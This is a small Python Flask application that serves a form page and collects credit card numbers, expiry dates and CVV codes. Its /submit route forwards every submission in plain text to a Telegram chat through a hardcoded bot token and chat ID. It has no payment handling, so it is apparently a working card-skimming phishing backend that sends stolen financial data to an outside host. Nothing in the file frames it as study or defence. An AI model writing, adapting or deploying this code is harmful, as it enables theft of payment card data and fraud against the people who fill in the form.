from flask import Flask, request, render_template
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '7050929517:AAGSnEhUbH9hF9wBtZGQd3Hyc8sj78XIihs'
TELEGRAM_CHAT_ID = '7049562542'

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    credit_card_number = request.form['credit_card_number']
    expiry_month = request.form['expiry_month']
    expiry_year = request.form['expiry_year']
    cvv = request.form['cvv']
    
    message = f"Credit Card Number: {credit_card_number}\nExpiry Month: {expiry_month}\nExpiry Year: {expiry_year}\nCVV: {cvv}"
    send_to_telegram(message)
    
    return "Information Sent!"

def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=data)

if __name__ == '__main__':
    app.run(debug=True)
  
